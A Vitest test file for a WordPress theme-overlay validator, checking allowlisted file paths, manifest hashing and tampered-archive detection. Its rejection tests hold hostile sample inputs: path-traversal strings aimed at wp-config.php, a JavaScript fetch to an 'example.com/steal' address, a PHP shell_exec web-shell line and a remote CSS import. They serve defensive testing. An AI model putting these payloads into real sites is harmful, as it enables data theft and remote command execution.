import { describe, expect, it } from 'vitest'
import { strToU8, zipSync } from 'fflate'
import {
  buildOverlayFunctionsPhp,
  buildOverlayPackageManifest,
  validateStoredOverlayPackage,
  validateOverlayProposalStatic,
} from '@/utils/siteforge/editor/overlay'
import { hashSiteForgeContent } from '@/utils/siteforge/content-hash'

describe('validateOverlayProposalStatic', () => {
  it('accepts allowlisted CSS, JavaScript, and template partials', () => {
    const proposal = validateOverlayProposalStatic({
      reason: 'Add a supported visual treatment',
      files: [
        {
          path: 'assets/css/custom-hero.css',
          content: '.hero { opacity: 0.95; }',
        },
        {
          path: 'assets/js/custom-hero.js',
          content: 'document.querySelector(".hero")?.classList.add("ready")',
        },
        {
          path: 'partials/custom-hero.php',
          content: '<?php echo esc_html( $args["title"] ?? "" ); ?>',
        },
      ],
    })
    expect(proposal.files).toHaveLength(3)
  })

  it.each([
    '../functions.php',
    '/tmp/payload.js',
    'functions.php',
    'assets/images/payload.svg',
    'partials/../../wp-config.php',
  ])('rejects non-allowlisted path %s', path => {
    expect(() =>
      validateOverlayProposalStatic({
        reason: 'unsafe',
        files: [{ path, content: 'safe' }],
      })
    ).toThrow()
  })

  it('rejects dangerous JavaScript execution and network primitives', () => {
    expect(() =>
      validateOverlayProposalStatic({
        reason: 'unsafe',
        files: [
          {
            path: 'assets/js/payload.js',
            content: 'fetch("https://example.com/steal")',
          },
        ],
      })
    ).toThrow(/forbidden behavior/)
  })

  it('rejects dangerous PHP process primitives', () => {
    expect(() =>
      validateOverlayProposalStatic({
        reason: 'unsafe',
        files: [
          {
            path: 'partials/payload.php',
            content: '<?php shell_exec($_GET["command"]); ?>',
          },
        ],
      })
    ).toThrow(/forbidden behavior/)
  })

  it('rejects malformed or remotely importing CSS', () => {
    expect(() =>
      validateOverlayProposalStatic({
        reason: 'unsafe',
        files: [
          {
            path: 'assets/css/payload.css',
            content: '@import url("https://example.com/payload.css"); .x { color: red;',
          },
        ],
      })
    ).toThrow()
  })

  it('preserves parent theme token precedence in child overlays', () => {
    const functionsPhp = buildOverlayFunctionsPhp(
      ['assets/css/logo-blend.css'],
      []
    )

    expect(functionsPhp).toContain("array( 'oneclick-siteforge-style' )")
    expect(functionsPhp).not.toContain('oneclick-siteforge-parent')
    expect(functionsPhp).not.toContain(
      "get_template_directory_uri() . '/style.css'"
    )
  })

  it('includes generated runtime files in its verifiable manifest hash', () => {
    const { functionsPhp, manifest } = buildOverlayPackageManifest({
      reason: 'Blend the approved logo into the header background',
      files: [
        {
          path: 'assets/css/logo-blend.css',
          content: '.site-header .custom-logo { mix-blend-mode: multiply; }',
        },
      ],
    })

    expect(manifest.files.map(file => file.path)).toEqual([
      'assets/css/logo-blend.css',
      'functions.php',
    ])
    expect(manifest.contentHash).toBe(hashSiteForgeContent(manifest.files))
    expect(functionsPhp).toContain("array( 'oneclick-siteforge-style' )")
    expect(functionsPhp).not.toContain('oneclick-siteforge-parent')
  })

  it('reuses only stored packages whose manifest and files are exact', () => {
    const css = '.site-header .custom-logo { mix-blend-mode: multiply; }'
    const proposal = {
      reason: 'Blend the approved logo into the header background',
      files: [{ path: 'assets/css/logo-blend.css', content: css }],
    }
    const { functionsPhp, manifest } = buildOverlayPackageManifest(proposal)
    const archive = zipSync({
      'assets/css/logo-blend.css': strToU8(css),
      'functions.php': strToU8(functionsPhp),
      'siteforge-overlay.json': strToU8(
        JSON.stringify({ manifest, reason: proposal.reason })
      ),
    })

    expect(validateStoredOverlayPackage(archive, manifest)).toMatch(
      /^[a-f0-9]{64}$/
    )
    const tamperedArchive = zipSync({
      'assets/css/logo-blend.css': strToU8(`${css}\n.tampered { color: red; }`),
      'functions.php': strToU8(functionsPhp),
      'siteforge-overlay.json': strToU8(JSON.stringify({ manifest })),
    })
    expect(() =>
      validateStoredOverlayPackage(tamperedArchive, manifest)
    ).toThrow(/file does not match/)
  })
})
